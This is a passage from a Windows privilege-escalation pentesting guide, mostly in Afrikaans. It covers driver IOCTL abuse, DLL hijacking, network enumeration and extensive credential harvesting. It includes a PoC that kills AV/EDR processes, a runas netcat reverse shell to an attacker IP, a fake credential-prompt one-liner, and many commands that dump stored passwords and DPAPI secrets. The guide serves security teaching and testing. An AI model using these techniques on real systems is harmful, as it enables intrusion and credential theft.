- \\ .\\amsdk\\anyfile (from a real-world case)

Sodra 'n gebruiker die device kan open, kan geprivilegieerde IOCTLs blootgestel deur die driver misbruik word vir LPE en tampering. Voorbeelde van vermoëns wat in die wild waargeneem is:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigasies vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN in wanneer jy device objects skep wat bedoel is om deur 'n DACL beperk te word.
- Valideer die caller context vir geprivilegieerde operasies. Voeg PP/PPL-kontroles by voordat jy prosesbeëindiging of handle returns toelaat.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel privileges.

Opsporingsidees vir verdedigers
- Moniteer user-mode opens van verdagte device names (e.g., \\ .\\amsdk*) en spesifieke IOCTL-sekwense wat op misbruik dui.
- Handhaaf Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) en onderhou jou eie allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Kontroleer permissies van alle gidse in PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Netwerk

### Gedeelde hulpbronne
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kontroleer vir ander bekende rekenaars wat hardcoded is in die hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerk koppelvlakke & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop poorte

Kontroleer vir **beperkte dienste** van buite
```bash
netstat -ano #Opened ports?
```
### Roeteringstabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Kyk na hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy die root user kry, kan jy op enige port luister (die eerste keer wat jy `nc.exe` gebruik om op 'n port te luister, sal dit via die GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL`-lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Inlogbewyse

### Winlogon Inlogbewyse
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows Vault stoor gebruikersinlogbewyse vir servers, webwerwe en ander programme waarvoor **Windows** gebruikers **log in the users automaticall**y. Op die oog af mag dit lyk asof gebruikers hul Facebook-, Twitter- en Gmail-inlogbewyse ens. kan stoor sodat hulle outomaties via browsers aangemeld word. Maar dit is nie so nie.

Windows Vault stoor inlogbewyse wat Windows kan gebruik om gebruikers outomaties aan te meld, wat beteken dat enige **Windows application that needs credentials to access a resource** (server of 'n webwerf) **can make use of this Credential Manager** & Windows Vault en die verskafde inlogbewyse kan gebruik in plaas daarvan dat gebruikers telkens die gebruikersnaam en wagwoord moet invoer.

Tensy die toepassings met Credential Manager interakteer, dink ek nie dit is moontlik dat hulle die inlogbewyse vir 'n bepaalde hulpbron kan gebruik nie. As jou toepassing dus die vault wil gebruik, moet dit op een of ander manier **communicate with the credential manager and request the credentials for that resource** vanaf die standaard stoor-vault.

Gebruik die `cmdkey` om die gestoor inlogbewyse op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde credentials te gebruik. Die volgende voorbeeld roep 'n remote binary aan via 'n SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik van `runas` met 'n verskafde stel credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let wel dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of deur [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bied 'n metode vir symmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die symmetriese enkripsie van asymmetriese private sleutels. Hierdie enkripsie maak gebruik van 'n gebruiker- of stelselgeheim om wesenlik tot entropie by te dra.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenario's wat stelsel-enkripsie behels, gebruik dit die stelsel se domein-outhentiseringsgeheime.

Gekodeerde gebruikers RSA-sleutels, deur gebruik te maak van DPAPI, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI sleutel, saam met die meester-sleutel wat die gebruiker se private sleutels in dieselfde lêer beskerm**, bestaan tipies uit 64 bytes ewekansige data. (Dit is belangrik om daarop te let dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud met die `dir`-opdrag in CMD gelys word, alhoewel dit deur PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te ontsleutel.

Die **credentials files protected by the master password** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` gebruik met die toepaslike `/masterkey` om te ontsleutel.\
Jy kan **extract many DPAPI** **masterkeys** from **memory** met die `sekurlsa::dpapi` module (as jy root is).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels gebruik vir **scripting** en automatiseringstake as 'n manier om encrypted credentials gerieflik te stoor. Die credentials word beskerm deur **DPAPI**, wat tipies beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is, ontsleutel kan word.

Om 'n PS credentials uit die lêer wat dit bevat te **decrypt** kan jy die volgende doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindinge

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Afstandslessenaar Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg` module met die toepaslike `/masterkey` om **decrypt any .rdg files**\
Jy kan **extract many DPAPI masterkeys** uit geheue met die Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Mense gebruik dikwels die StickyNotes app op Windows werkstasies om **save passwords** en ander inligting te stoor, sonder om te besef dat dit 'n database-lêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om na te soek en te ondersoek.

### AppCmd.exe

**Let wel: om passwords vanaf AppCmd.exe te recover moet jy Administrator wees en dit onder 'n High Integrity level laat loop.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` directory.\
As hierdie lêer bestaan, is dit moontlik dat sekere **credentials** gekonfigureer is en **recovered** kan word.

Hierdie kode is onttrek vanaf [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installers word **run with SYSTEM privileges** uitgevoer, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH gasheer-sleutels
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in die register

SSH private keys kan binne die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, daarom moet jy kyk of daar iets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, sal dit waarskynlik 'n gestoor SSH-sleutel wees. Dit word versleuteld gestoor maar kan maklik ontsleutel word deur gebruik te maak van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent` service nie loop nie en jy wil hê dit moet outomaties by opstart begin, voer:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar `ssh`-sleutels te skep, dit met `ssh-add` by te voeg en via `ssh` na 'n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en `procmon` het nie die gebruik van `dpapi.dll` tydens die asymmetriese sleutelverifikasie geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan hierdie lêers ook soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rugsteunkopieë
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolk-kredensiale
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek vir 'n lêer met die naam **SiteList.xml**

### Gekacheerde GPP Wagwoord

Daar was voorheen 'n funksie beskikbaar wat die implementering van pasgemaakte plaaslike administratorrekeninge op 'n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter beduidende sekuriteitsgebreke gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is, deur enige domeingebruiker geraadpleeg word. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 versleuteld is met 'n openbaar gedokumenteerde standaard sleutel, deur enige geverifieerde gebruiker ontsleutel word. Dit het 'n ernstige risiko gebied, aangesien dit gebruikers hoër voorregte kon gee.

Om hierdie risiko te verminder is 'n funksie ontwikkel wat vir plaaslik gekachte GPP-lêers skandeer wat 'n "cpassword" veld bevat wat nie leeg is nie. Wanneer so 'n lêer gevind word, ontsleutel die funksie die wagwoord en gee 'n persoonlike PowerShell-objek terug. Hierdie objek sluit besonderhede oor die GPP en die lêer se ligging in, wat help met die identifikasie en herstel van hierdie sekuriteitskwessie.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor Windows Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te ontsleutel:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web-konfigurasie
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-inlogbewyse
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd die **gebruiker vra om sy credentials of selfs die credentials van 'n ander gebruiker in te voer** as jy dink hy kan dit weet (let daarop dat **om die kliënt direk te vra** vir die **credentials** werklik **riskant** is):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat credentials bevat**

Bekende lêers wat vroeër **passwords** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Inlogbewyse in die Prullemand

Jy moet ook die Prullemand nagaan om te sien of daar inlogbewyse daarbinne is

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike registersleutels met inlogbewyse**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet kyk vir dbs waar wagwoorde van **Chrome or Firefox** gestoor word.\
Kyk ook na die geskiedenis, boekmerke en gunstelinge van die blaaiers, want moontlik is sommige **wagwoorde** daar gestoor.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is a technology built within the Windows operating system that allows **intercommunication** between software components of different languages. Each COM component is **identified via a class ID (CLSID)** and each component exposes functionality via one or more interfaces, identified via interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be Apartment (Single-Threaded), Free (Multi-Threaded), Both (Single or Multi) or Neutral (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generiese wagwoordsoektog in lêers en register**

Soek na lêerinhoud
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n bepaalde lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat na wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin wat ek geskep het om **outomaties elke metasploit POST module wat na credentials soek** binne die slagoffer uit te voer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende hulpmiddel om wagwoorde uit 'n stelsel te onttrek.

Die tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in platte teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **a process running as SYSTEM open a new process** (`OpenProcess()`) met **full access**. Dieselfde proses **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
As jy dan **full access to the low privileged process** het, kan jy die **open handle to the privileged process created** wat met `OpenProcess()` geskep is, gryp en **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheue-segmente, bekend as **pipes**, maak proseskommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Named Pipes**, wat toelaat dat ongebonde prosesse data deel, selfs oor verskillende netwerke. Dit lyk soos 'n client/server-argitektuur, met rolle gedefinieer as **named pipe server** en **named pipe client**.

